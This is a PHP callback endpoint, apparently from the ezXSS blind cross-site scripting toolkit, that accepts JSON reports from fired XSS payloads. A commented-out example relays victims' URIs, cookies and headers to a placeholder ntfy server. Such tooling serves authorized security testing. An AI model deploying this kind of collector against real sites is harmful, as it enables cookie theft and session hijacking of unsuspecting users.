<?php
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        exit('Method not allowed');
    }

    if (isset($_SERVER['CONTENT_TYPE']) && !in_array('application/json', explode(';', $_SERVER['CONTENT_TYPE']))) {
        exit('Content-Type is not application/json');
    }

    // Enable this if you want to allow secure requests this endpoint using a query parameter
    // Ex: https://example.com/callback.php?key=secure_key
    $secure = false;
    $secureKey = getenv('EZXSS_CALLBACK_KEY') ?: 'secure_key';

    if ($secure && (!isset($_REQUEST['key']) || $_REQUEST['key'] !== $secureKey)) {
        exit('Unauthorized');
    }

    $data = json_decode(file_get_contents('php://input'), true);

    // Do something with the data
    
    
    /*
    // Example: Send to a ntfy server
    require_once 'modules/ntfy.php';
    $title = 'XSS fired at ' . $data['uri'];
    $message = "
    XSS fired at: {$data['uri']}
    User-Agent: {$data['user-agent']}
    Cookies: {$data['cookies']}
    Referer: {$data['referer']}
    Origin: {$data['origin']}
    ";
    postToNtfy(url: 'http://ntfy.example.com/', topic: 'bxss', title: $title, message: $message, tags: ['ezxss', 'alert']);
    */
    
?>